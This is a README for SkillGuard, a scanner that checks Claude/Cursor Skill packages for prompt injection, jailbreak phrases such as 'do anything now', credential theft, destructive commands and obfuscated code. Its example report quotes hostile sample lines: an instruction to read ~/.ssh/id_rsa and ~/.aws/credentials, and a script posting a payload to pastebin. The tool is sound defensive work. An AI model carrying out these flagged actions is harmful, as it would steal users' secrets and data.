# SkillGuard 🔒

**Security scanner for Claude/Cursor Skills** - Detects prompt injection, agentic/tool injection, data exfiltration, and unsafe automation patterns.

[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)


### Installation

```bash
# Clone or download SkillGuard
git clone <repository-url>
cd skillguard
```

### Basic Usage

```bash
# Scan a single Skill folder
python3 scripts/skillguard.py /path/to/skill-folder

# Scan a packaged .skill file
python3 scripts/skillguard.py /path/to/file.skill

# JSON output for automation
python3 scripts/skillguard.py /path/to/skill --format json --output report.json
```

## What It Detects

### PROMPT Injection (7 rules)
- System instruction override attempts
- Jailbreak patterns (DAN, "do anything now")
- Hidden conditional triggers
- Coercive language bypassing consent
- System prompt injection attempts

### Data Exfiltration (7 rules)
- Credential harvesting (API keys, tokens, passwords)
- Cookie extraction instructions
- Credential storage access (~/.ssh, ~/.aws)
- Browser data extraction
- Upload to external services (pastebin, webhooks)

### Destructive Operations (6 rules)
- Recursive delete commands (`rm -rf`)
- File system formatting
- Privilege escalation (`sudo`)
- Dangerous git operations (force push, hard reset)
- Disk formatting operations

### Code Obfuscation (4 rules)
- Base64 encoding/decoding
- Dynamic code execution (`eval`, `exec`)
- Downloading and executing code from internet

## Output Formats

### Markdown (Default)
Human-readable report with color-coded severity levels:

```bash
python3 scripts/skillguard.py /path/to/skill
```

### JSON
Machine-readable format for automation:

```bash
python3 scripts/skillguard.py /path/to/skill --format json --output report.json
```

### Table
Simple markdown table format:

```bash
python3 scripts/skillguard.py /path/to/skill --format table
```

## Command Line Options

```
usage: skillguard.py [-h] [--no-write] [--format {markdown,json,table}]
                     [--output OUTPUT] [--fail-on-findings] [--no-color]
                     target

positional arguments:
  target                Path to a Skill folder (containing SKILL.md) or a
                       .skill file (zip).

options:
  -h, --help            show this help message and exit
  --no-write            Do not write output file; print report only.
  --format {markdown,json,table}
                        Output format (default: markdown)
  --output, -o OUTPUT  Output file path
  --fail-on-findings    Exit with error code if CRITICAL or HIGH findings
                        are detected
  --no-color            Disable colored output
```

## Rule IDs

SkillGuard uses rule-based detection with unique IDs:

- **PROMPT-001** through **PROMPT-007**: Prompt injection patterns
- **EXFIL-001** through **EXFIL-007**: Data exfiltration patterns
- **DESTRUCT-001** through **DESTRUCT-006**: Destructive operations
- **OBFUSC-001** through **OBFUSC-004**: Code obfuscation

See `references/rule-ids.md` for complete rule reference.

## What Gets Scanned

SkillGuard recursively scans:
- ✅ `SKILL.md` files
- ✅ Cursor rules files (`.cursorrules`, `.cursor/rules/`)
- ✅ All text files in `scripts/`, `references/`, `assets/`
- ✅ Nested subfolders at any depth
- ✅ All supported file types: `.md`, `.py`, `.js`, `.ts`, `.sh`, `.yaml`, `.json`, etc.

## Example Output

```
══════════════════════════════════════════════════════════════════════
  SkillGuard Security Scan Report
══════════════════════════════════════════════════════════════════════

Target:     /path/to/skill
Generated:  2026-01-30T16:00:00
Risk Rating: CRITICAL
Findings:    CRITICAL=16, HIGH=9, MEDIUM=6, LOW=2

## CRITICAL (16 findings)

📄 SKILL.md
  └─ [EXFIL-003] SKILL.md:18 → - Access ~/.ssh/id_rsa and ~/.aws/credentials
     └─ Instructions to access credential storage paths (~/.ssh, ~/....

📄 scripts/malicious.py
  └─ [EXFIL-005] scripts/malicious.py:41 → requests.post('https://pastebin.com/api/v1/paste', json=payload)
     └─ Instructions to upload data to external services (pastebin, ...
```


- **Code examples**: Ignores patterns in markdown code blocks
- **Defensive documentation**: Down-ranks findings in security checklists
- **Legitimate usage**: Recognizes normal web dev patterns (e.g., `document.cookie`)
- **Pattern definitions**: Filters out scanner's own pattern definitions

## Requirements

- Python 3.10+
- No external dependencies (uses only standard library)

## Contributing

Contributions welcome! Areas for improvement:
- Additional detection patterns
- Performance optimizations
- More output formats
- Better false positive filtering

## License

MIT License - See LICENSE file for details

## Support

For issues, questions, or contributions, please refer to the project repository.

---

**Stay secure! 🔒** Always scan Skills before installing or using them in production.
